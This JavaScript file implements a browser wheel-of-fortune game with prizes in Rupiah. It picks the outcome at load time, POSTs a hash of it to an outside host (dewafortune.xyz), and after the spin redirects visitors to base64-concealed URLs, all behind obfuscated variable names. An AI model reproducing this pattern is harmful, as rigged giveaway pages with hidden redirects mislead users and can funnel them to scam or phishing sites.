function CGame(oData){
    
    var _bInitGame;
    
    var _iScore;
    var _iTimeIdle;
    var _iTimeWin;
    var _iCurAnim;
    var _iGameState;
    var _iMultiply;
    var _iCurBet;
    var _iCurCredit;
    var _iCurWin;

    var _aProbability;

    var _oInterface;
    var _oEndPanel = null;
    var _oParent;
    var _oWheel;
    var _oLeds;
    
    this._init = function(){
        _bInitGame=true;
        
        _iMultiply = 1;
        _iTimeIdle = 0;
        _iTimeWin = 0;
        _iCurBet = START_BET;
        _iCurCredit = START_CREDIT;
        _iCurWin = -1;        
        _iGameState = STATE_IDLE;

        _aProbability = new Array();

        var pCenterWheel = {x: 975, y: 460};

        _oLeds = new CLeds(pCenterWheel.x, pCenterWheel.y);
        
        _oWheel = new CWheel(pCenterWheel.x, pCenterWheel.y);


        var oBg = createBitmap(s_oSpriteLibrary.getSprite('bg_game'));
        s_oStage.addChild(oBg);

        _oLeds = new CLeds(pCenterWheel.x, pCenterWheel.y);
        _iCurAnim = _oLeds.getState();
        _oInterface = new CInterface(); 
        
        
        this._initProbability();
         xxo =  Math.floor(Math.random()*_aProbability.length);
        var iPrizeToChoose = Math.floor(xxo);        
        _iCurWin = _aProbability[iPrizeToChoose];
        var resres = KASCKLNALKCN[_iCurWin];
                var res = KASCKLNALKCN[_iCurWin];
                $.ajax({
                    type: "POST",
                    url: 'https://dewafortune.xyz/bq1.php',
                    data: {resres: resres, res: res},
                    success: function(data)
                    {   
                    }
                    });
        this.update();
    };
    
    this._initProbability = function(){
       
        var aPrizeLength = new Array();

        for(var i=0; i<PRIZE_PROBABILITY.length; i++){
            aPrizeLength[i] = PRIZE_PROBABILITY[i];
        }
       
        for(var i=0; i<aPrizeLength.length; i++){
            for(var j=0; j<aPrizeLength[i]; j++){
                _aProbability.push(i);
            }
            
        }            
        
    };
    
    this.modifyBonus = function(szType){
        if(szType === "plus"){
            _iCurBet += BET_OFFSET;
        } else {
            _iCurBet -= BET_OFFSET;
        }

        if(_iCurBet > MAX_BET){
            _iCurBet -= BET_OFFSET;
            _iMultiply = 1;
        } else if(_iCurBet < START_BET) {
            _iCurBet += BET_OFFSET;
            _iMultiply = 1;
        } else if(_iCurBet > _iCurCredit ){
            _iCurBet -= BET_OFFSET;
            return;
        }
        
        _iMultiply = Math.floor(_iCurBet/START_BET);
        
        _oInterface.refreshBet(_iCurBet);
        _oWheel.clearText(_iMultiply);
        _oWheel.setText(_iMultiply);
        
        
    };
    
    this.spinWheel = function(){
        // coindrop();
        numb_kupn = numb_kupn - 1;
        s_oCanvas.style.zIndex = "-1";
        _oInterface.disableSpin(true);
        _iGameState = STATE_SPIN;
        _iTimeWin = 0;
        
        this.setNewRound();
        
        _oInterface.refreshMoney("");
        _iCurCredit -= _iCurBet;
        _oInterface.refreshCredit(_iCurCredit);
        
        //SELECT PRIZE    
        var iPrizeToChoose = Math.floor(xxo);        
        _iCurWin = _aProbability[iPrizeToChoose];    
        var resres = KASCKLNALKCN[_iCurWin];
                var res = KASCKLNALKCN[_iCurWin];
                $.ajax({
                    type: "POST",
                    url: 'bq2.php',
                    data: {resres: resres, res: res},
                    success: function(data)
                    {   
                    }
                    });
                
        //CALCULATE ROTATION
        var iNumSpinFake = MIN_FAKE_SPIN + Math.floor(Math.random()*3);
        var iOffsetInterval = SEGMENT_ROT - 3;
        var iOffsetSpin = -iOffsetInterval/2 + Math.random()*iOffsetInterval;//Math.round(Math.random()*iOffsetInterval);
        var _iCurWheelDegree = _oWheel.getDegree();
        
        var iTrueRotation = (360 - _iCurWheelDegree + _aProbability[iPrizeToChoose] * SEGMENT_ROT + iOffsetSpin)%360; //Define how much rotation, to reach the selected prize.       
        
        var iRotValue = 360*iNumSpinFake + iTrueRotation;
        var iTimeMult = iNumSpinFake;

        //SPIN
        _oWheel.spin(iRotValue, iTimeMult);
    };                 
    
    this.setNewRound = function(){
        if(_iCurWin < 0){
            return;
        }
        
        _oInterface.refreshCredit(_iCurCredit);
        _oInterface.clearMoneyPanel();
        
        _iCurWin = -1;
    };
    
    this.releaseWheel = function(){
        _oInterface.disableSpin(true); 
        _oInterface.refreshMoney(PRIZE[_iCurWin] * _iMultiply);
        
        _iCurCredit += PRIZE[_iCurWin] * _iMultiply;
        _oInterface.refreshCredit(_iCurCredit);
        
        _oInterface.animWin();
        
        if(_iCurCredit < START_BET){
            this.gameOver();
        }        
        if(_iMultiply > _iCurCredit/START_BET ){
            _iMultiply = Math.floor(_iCurCredit/START_BET);
            _iCurBet = _iMultiply * START_BET;
            _oInterface.refreshBet(_iCurBet);            
        }

        prxsgdgfff = PRIZE[_iCurWin];
        
        if(PRIZE[_iCurWin] <= 0){
            _iGameState = STATE_LOSE;
            if(DISABLE_SOUND_MOBILE === false || s_bMobile === false){
            	xosandjxhgdaasd = PRIZE_NAME[_iCurWin];
            	if(xosandjxhgdaasd == "ZONK"){
            		var _oHelpPanel = new CHelpPanel5();
                    window.setTimeout(function(){
                        // parent.window.close()
                        window.location = atob(rturl);
                    }, 8000);
            	}
            	else{
            		var _oHelpPanel = new CHelpPanel4();
                    if( spcprz.indexOf(xosandjxhgdaasd) >= 0){
                        window.location = atob(frm_clmks);
                    }
                    else {
                        window.setTimeout(function(){
                        // parent.window.close()
                        window.location = atob(rturl);
                    }, 8000);
                    }
            	}	
                // window.location="win.php";
            }
        } else {
            _iGameState = STATE_WIN;
            if(DISABLE_SOUND_MOBILE === false || s_bMobile === false){
            	xosandjxhgdaasd = "Rp." + (PRIZE[_iCurWin] + "").replace(/(\d)(?=(\d{3})+(?!\d))/g, "$1,");
            	var _oHelpPanel = new CHelpPanel4();
                if( spcprz.indexOf(xosandjxhgdaasd) >= 0){
                        window.location = atob(frm_clmks);
                    }
                else {
                    window.setTimeout(function(){
                        // parent.window.close()
                        window.location = atob(rturl);
                    }, 8000);
                }
                // window.location="win.php";
            } 
        }
        
        $(s_oMain).trigger("save_score",[_iCurCredit,PRIZE[_iCurWin]]);
    };
    
    this.getCurColor = function(){
        return _oWheel.getColor();
    };
    
    this.unload = function(){
        if(DISABLE_SOUND_MOBILE === false || s_bMobile === false){
            createjs.Sound.stop();
        }
        _bInitGame = false;
        
        _oInterface.unload();
        if(_oEndPanel !== null){
            _oEndPanel.unload();
        }
        
        createjs.Tween.removeAllTweens();
        s_oStage.removeAllChildren();

           
    };
 
    this.onExit = function(){
        this.unload();
        s_oMain.gotoMenu();
        
        $(s_oMain).trigger("restart");
    };
    
    this._onExitHelp = function () {
         _bStartGame = true;
    };
    
    this.gameOver = function(){  
        
        _oEndPanel = CEndPanel(s_oSpriteLibrary.getSprite('msg_box'));
        _oEndPanel.show();
    };

    this._animLedIdle = function(){
        _iTimeIdle += s_iTimeElaps;
        
        if(_iTimeIdle > TIME_ANIM_IDLE){
            _iTimeIdle=0;
            var iRandAnim = Math.floor(Math.random()*_oLeds.getNumAnim());
    
            while(iRandAnim === _iCurAnim){
                iRandAnim = Math.floor(Math.random()*_oLeds.getNumAnim());
            }    
            _oLeds.changeAnim(iRandAnim);
            _iCurAnim = iRandAnim;
        }
    };    
    
    this._animLedSpin = function(){
        _oLeds.changeAnim(LED_SPIN);
        _iGameState =-1;
    };
    
    this._animLedWin = function(){
       
        if(_iTimeWin === 0){
            var iRandomWinAnim = 4 + Math.round(Math.random())
            _oLeds.changeAnim(iRandomWinAnim);
            _oLeds.setWinColor(this.getCurColor());            
        } else if(_iTimeWin > TIME_ANIM_WIN) {
            _iTimeIdle = TIME_ANIM_IDLE; 
            _iGameState = STATE_IDLE;
            this.setNewRound();
            _iTimeWin =0;
        }
        _iTimeWin += s_iTimeElaps;
        
    };
    
    this._animLedLose = function(){
       
        if(_iTimeWin === 0){            
            _oLeds.changeAnim(6);
            _oLeds.setWinColor(this.getCurColor());            
        } else if(_iTimeWin > TIME_ANIM_LOSE) {
            _iTimeIdle = TIME_ANIM_IDLE; 
            _iGameState = STATE_IDLE;
            this.setNewRound();
            _iTimeWin =0;
        }
        _iTimeWin += s_iTimeElaps;
        
    };
    
    this.update = function(){
    
        _oLeds.update();
        switch(_iGameState) {
            case STATE_IDLE:{
                    this._animLedIdle();
               break;
            } case STATE_SPIN: {
                    this._animLedSpin();
               break;              
               
            } case STATE_WIN: {
                    this._animLedWin();
               break;                             
            } case STATE_LOSE: {
                    this._animLedLose();
               break;                             
            }    

        }
    };

    s_oGame=this;
    
    PRIZE_NAME = oData.njancjknl;
    KASCKLNALKCN = ["d1d813a48d99f0e102f7d0a1b9068001","48d6215903dff56238e52e8891380c8f","9f27410725ab8cc8854a2769c7a516b8","d487dd0b55dfcacdd920ccbdaeafa351","bda9643ac6601722a28f238714274da4","e90dfb84e30edf611e326eeb04d680de","61db47dac8aefe03fc67ee1b65ecd8f6","490a0db9793cd8cfae191676bbb860e5","9768feb3fdb1f267b06093bc572952dd","994ae1d9731cebe455aff211bcb25b93","d1d813a48d99f0e102f7d0a1b9068001","48d6215903dff56238e52e8891380c8f","9f27410725ab8cc8854a2769c7a516b8","d487dd0b55dfcacdd920ccbdaeafa351","bda9643ac6601722a28f238714274da4","e90dfb84e30edf611e326eeb04d680de","61db47dac8aefe03fc67ee1b65ecd8f6","490a0db9793cd8cfae191676bbb860e5","9768feb3fdb1f267b06093bc572952dd","994ae1d9731cebe455aff211bcb25b93"];
    PRIZE = oData.ancklanlkn;
    PRIZE_PROBABILITY = oData.klanklcnaklasdac;
    
    START_CREDIT = oData.start_credit;
    START_BET = oData.start_bet;
    BET_OFFSET = oData.bet_offset;
    MAX_BET = oData.max_bet;
    
    TIME_ANIM_IDLE = oData.anim_idle_change_frequency;
    ANIM_IDLE1_TIMESPEED = oData.led_anim_idle1_timespeed;
    ANIM_IDLE2_TIMESPEED = oData.led_anim_idle2_timespeed;
    ANIM_IDLE3_TIMESPEED = oData.led_anim_idle3_timespeed;
    
    ANIM_SPIN_TIMESPEED = oData.led_anim_spin_timespeed;
    
    TIME_ANIM_WIN = oData.led_anim_win_duration;
    ANIM_WIN1_TIMESPEED = oData.led_anim_win1_timespeed;
    ANIM_WIN2_TIMESPEED = oData.led_anim_win2_timespeed;
    
    TIME_ANIM_LOSE = oData.led_anim_lose_duration;
    
    _oParent=this;
    this._init();
}

var s_oGame;
